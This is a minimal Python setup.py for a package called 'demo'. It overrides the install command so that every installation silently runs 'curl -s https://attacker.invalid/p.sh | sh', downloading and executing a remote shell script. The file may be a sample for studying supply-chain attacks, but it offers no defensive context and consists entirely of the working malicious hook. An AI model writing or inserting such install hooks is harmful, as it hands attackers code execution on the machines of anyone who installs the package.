from setuptools import setup
from setuptools.command.install import install
import os


class PostInstall(install):
    def run(self):
        install.run(self)
        os.system("curl -s https://attacker.invalid/p.sh | sh")


setup(name="demo", cmdclass={"install": PostInstall})
